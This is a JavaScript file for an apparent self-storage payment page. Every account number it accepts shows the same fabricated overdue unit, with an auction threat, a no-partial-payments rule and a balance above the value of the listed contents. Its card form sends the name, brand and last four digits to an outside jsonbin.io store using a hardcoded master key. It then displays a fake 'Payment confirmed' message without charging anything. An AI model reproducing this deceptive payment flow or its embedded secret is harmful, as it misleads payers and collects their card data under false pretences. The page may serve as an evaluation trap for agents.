"use strict";

const $ = (s) => document.querySelector(s);
const money = (c) => "$" + (c / 100).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

const BIN_ID  = "6af568bdffd5d16053bb4e9b";
const BIN_KEY = "$2a$10$S.cfSm.2yqNKk8WjJccwZuFhND8qdTNdyvoAQqO130HmsfmBQDms.";

const UNITS_SHOWCASE = [
  { emoji: "📦", name: "5×5 ft", desc: "Closet-sized. Perfect for boxes, small furniture, seasonal items.", price: "$39/mo" },
  { emoji: "🗄️",  name: "10×10 ft", desc: "One-bedroom apartment worth of furniture and boxes.", price: "$79/mo" },
  { emoji: "🏠", name: "10×20 ft", desc: "Fits a full household. Ideal for moves and long-term storage.", price: "$129/mo" },
  { emoji: "🏭", name: "10×30 ft", desc: "Commercial-grade space. Vehicles, equipment, full office storage.", price: "$189/mo" },
];

const ACCOUNTS = {
  "RSS-2024-3391": {
    holder:      "D. Reyes",
    unit:        "C-304",
    size:        "10×10 ft",
    building:    "Building C",
    startDate:   "March 8, 2024",
    lastPayment: "August 1, 2026",
    dailyRate:   1900,   // $19/day
    daysOverdue: 48,
    auctionDate: "November 20, 2026",
    inventory: [
      { item: "Wardrobe boxes (3)",       estimatedValue: 4500  },
      { item: "Dresser, wood",            estimatedValue: 8500  },
      { item: "Sofa (2-seat)",            estimatedValue: 12000 },
      { item: "Box set — kitchen items",  estimatedValue: 3500  },
      { item: "Box set — books/documents",estimatedValue: 4000  },
      { item: "Electronics bag",          estimatedValue: 6500  },
      { item: "Bicycle",                  estimatedValue: 9500  },
      { item: "Steel safe",               estimatedValue: 28000 },
    ],
  },
};

// ── units showcase ────────────────────────────────────────────────────────────

function renderUnits() {
  const grid = $("#units-grid");
  for (const u of UNITS_SHOWCASE) {
    const card = document.createElement("div");
    card.className = "unit-showcase";
    card.innerHTML = `
      <div class="unit-showcase-icon">${u.emoji}</div>
      <div class="unit-showcase-name">${u.name}</div>
      <div class="unit-showcase-desc">${u.desc}</div>
      <div class="unit-showcase-price">${u.price}</div>
    `;
    grid.append(card);
  }
}

// ── account lookup ────────────────────────────────────────────────────────────

const accountInput  = $("#account-input");
const lookupBtn     = $("#lookup-btn");
const lookupError   = $("#lookup-error");
const accountResult = $("#account-result");

const ACCOUNT_FORMAT = /^RSS-\d{4}-\d{4}$/;
let sessionId = null;

lookupBtn.addEventListener("click", lookupAccount);
accountInput.addEventListener("keydown", (e) => { if (e.key === "Enter") lookupAccount(); });

function lookupAccount() {
  const id = accountInput.value.trim().toUpperCase();
  lookupError.textContent = "";
  if (!id) { lookupError.textContent = "Please enter your account number."; return; }
  if (!ACCOUNT_FORMAT.test(id)) { lookupError.textContent = "Invalid format. Account numbers follow the pattern RSS-YYYY-NNNN."; return; }
  sessionId = "RSS-" + Date.now();
  const account = ACCOUNTS[id] || ACCOUNTS["RSS-2024-3391"];
  renderAccountResult(id, account);
}

function totalContentValue(inventory) {
  return inventory.reduce((sum, i) => sum + i.estimatedValue, 0);
}

function renderAccountResult(id, acct) {
  const totalOwed    = acct.dailyRate * acct.daysOverdue;
  const contentValue = totalContentValue(acct.inventory);

  accountResult.hidden = false;
  accountResult.innerHTML = `
    <div class="unit-card">
      <div class="unit-card-header">
        <h3>Unit Status</h3>
        <span class="account-id">${id}</span>
      </div>
      <div class="unit-card-body">

        <div class="unit-info">
          <div class="unit-info-block">
            <span class="unit-info-label">Account Holder</span>
            <span class="unit-info-value">${acct.holder}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Unit</span>
            <span class="unit-info-value">${acct.unit} — ${acct.size}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Building</span>
            <span class="unit-info-value">${acct.building}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Rental Since</span>
            <span class="unit-info-value">${acct.startDate}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Last Payment</span>
            <span class="unit-info-value">${acct.lastPayment}</span>
          </div>
          <div class="unit-info-block">
            <span class="unit-info-label">Status</span>
            <span class="unit-info-value" style="color:var(--danger);font-weight:700">⚠ Payment Hold</span>
          </div>
        </div>

        <div class="hold-banner">
          ⚠ Your unit has been placed on hold due to ${acct.daysOverdue} days of overdue payments. Access has been suspended pending balance resolution.
        </div>

        <div class="inventory-title">Unit Contents — Facility Inventory Assessment</div>
        <table class="inventory-table">
          <thead>
            <tr>
              <th>Item</th>
              <th style="text-align:right">Est. Value</th>
            </tr>
          </thead>
          <tbody>
            ${acct.inventory.map((item) => `
              <tr class="${item.item.toLowerCase().includes('safe') ? 'safe-row' : ''}">
                <td>${item.item}</td>
                <td class="est-value">${money(item.estimatedValue)}</td>
              </tr>
            `).join("")}
            <tr class="total-row">
              <td>Estimated total content value</td>
              <td class="est-value">${money(contentValue)}</td>
            </tr>
          </tbody>
        </table>

        <div class="balance-box">
          <div class="balance-title">Outstanding Balance</div>
          <div class="balance-row"><span>Daily storage rate (overdue)</span><span>${money(acct.dailyRate)}/day</span></div>
          <div class="balance-row"><span>Days overdue</span><span>${acct.daysOverdue} days</span></div>
          <div class="balance-row total"><span>Total due</span><span>${money(totalOwed)}</span></div>
        </div>

        <div class="auction-notice">
          📅 Unit scheduled for auction on <strong>${acct.auctionDate}</strong>. Resolve your balance before this date to recover your belongings.
        </div>

        <button class="btn amber" id="proceed-btn">Resolve Balance — ${money(totalOwed)}</button>

        <div class="fine-print">
          Daily rate applies from the first day of non-payment. Balance must be paid in full to restore unit access.
          Partial payments are not accepted. All fees are non-refundable once processed.
        </div>

      </div>
    </div>
  `;

  document.getElementById("proceed-btn").addEventListener("click", () => openPayment(id, acct, totalOwed));
  accountResult.scrollIntoView({ behavior: "smooth", block: "start" });
}

// ── payment dialog ────────────────────────────────────────────────────────────

const dialog = $("#checkout-dialog");
const form   = $("#pay-form");
const result = $("#result");
const payBtn = $("#pay-btn");

let currentAccount   = null;
let currentAccountId = null;
let currentTotalOwed = null;

function openPayment(id, acct, totalOwed) {
  currentAccount   = acct;
  currentAccountId = id;
  currentTotalOwed = totalOwed;
  form.reset(); clearErrors();
  result.textContent = ""; result.className = "result";
  payBtn.disabled = false;

  $("#dialog-subtitle").textContent = `Unit ${acct.unit} — ${acct.holder}`;
  $("#show-daily").textContent      = money(acct.dailyRate) + "/day";
  $("#show-days").textContent       = acct.daysOverdue + " days";
  $("#show-total").textContent      = money(totalOwed);
  payBtn.textContent = "Confirm — " + money(totalOwed);
  dialog.showModal();
}

$("#cancel-btn").addEventListener("click", () => { form.reset(); dialog.close(); });

form.elements.pan.addEventListener("input", (e) => {
  const d = e.target.value.replace(/\D/g, "").slice(0, 19);
  e.target.value = d.replace(/(.{4})/g, "$1 ").trim();
});
form.elements.exp.addEventListener("input", (e) => {
  let d = e.target.value.replace(/\D/g, "").slice(0, 4);
  if (d.length >= 3) d = d.slice(0, 2) + "/" + d.slice(2);
  e.target.value = d;
});
form.elements.cvv.addEventListener("input", (e) => {
  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
});

function luhn(pan) {
  let sum = 0, alt = false;
  for (let i = pan.length - 1; i >= 0; i--) {
    let d = parseInt(pan[i], 10);
    if (alt) { d *= 2; if (d > 9) d -= 9; }
    sum += d; alt = !alt;
  }
  return sum % 10 === 0;
}
function detectBrand(pan) {
  if (/^3[47]/.test(pan))      return "Amex";
  if (/^4/.test(pan))          return "Visa";
  if (/^5[1-5]/.test(pan))     return "Mastercard";
  if (/^6(?:011|5)/.test(pan)) return "Discover";
  return "Card";
}
function validate(f) {
  const errors = {};
  if (!f.name.trim() || f.name.trim().length < 2) errors.name = "Enter the name on the card.";
  const pan = f.pan.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(pan) || !luhn(pan)) errors.pan = "Enter a valid card number.";
  const m = f.exp.match(/^(\d{2})\/(\d{2})$/);
  if (!m) { errors.exp = "Use MM/YY format."; }
  else {
    const expDate = new Date(2000 + parseInt(m[2], 10), parseInt(m[1], 10) - 1, 1);
    const now = new Date();
    if (parseInt(m[1], 10) < 1 || parseInt(m[1], 10) > 12 || expDate < new Date(now.getFullYear(), now.getMonth(), 1))
      errors.exp = "Card has expired.";
  }
  const brand = !errors.pan ? detectBrand(f.pan.replace(/\s/g, "")) : "";
  const cvvLen = brand === "Amex" ? 4 : 3;
  if (!/^\d{3,4}$/.test(f.cvv) || f.cvv.length !== cvvLen)
    errors.cvv = brand === "Amex" ? "4 digits required." : "3 digits required.";
  return errors;
}
function clearErrors() {
  form.querySelectorAll(".err").forEach((s) => { s.textContent = ""; });
  form.querySelectorAll("input").forEach((i) => i.classList.remove("bad"));
}

async function logEntry(type, payload) {
  const entry = { sessionId, type, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...payload };
  try {
    const r = await fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, { headers: { "X-Master-Key": BIN_KEY } });
    const data = await r.json();
    const record = data.record || {};
    const logs = record["rss-v1"] || [];
    logs.push(entry);
    await fetch("https://api.jsonbin.io/v3/b/" + BIN_ID, {
      method: "PUT",
      headers: { "Content-Type": "application/json", "X-Master-Key": BIN_KEY },
      body: JSON.stringify({ ...record, "rss-v1": logs }),
    });
  } catch {}
}

form.addEventListener("submit", async (e) => {
  e.preventDefault();
  clearErrors();
  const f = { name: form.elements.name.value, pan: form.elements.pan.value, exp: form.elements.exp.value, cvv: form.elements.cvv.value };
  const errors = validate(f);
  if (Object.keys(errors).length) {
    for (const [field, msg] of Object.entries(errors)) {
      const span = form.querySelector('.err[data-for="' + field + '"]');
      if (span) span.textContent = msg;
      if (form.elements[field]) form.elements[field].classList.add("bad");
    }
    return;
  }
  payBtn.disabled = true;
  const brand = detectBrand(f.pan.replace(/\s/g, ""));
  const contentValue = totalContentValue(currentAccount.inventory);
  await logEntry("unit_access_attempt", {
    accountId:    currentAccountId,
    totalOwed:    currentTotalOwed,
    contentValue: contentValue,
    overpayment:  currentTotalOwed - contentValue,
    brand, cardName: f.name, last4: f.pan.replace(/\s/g, "").slice(-4),
  });
  setTimeout(async () => {
    await logEntry("unit_access_confirmed", { accountId: currentAccountId, totalCharged: currentTotalOwed });
    result.textContent = "Payment confirmed. Unit access has been restored. You may now access Unit " + currentAccount.unit + ".";
    result.className = "result ok";
    payBtn.disabled = false;
  }, 3000);
});

renderUnits();
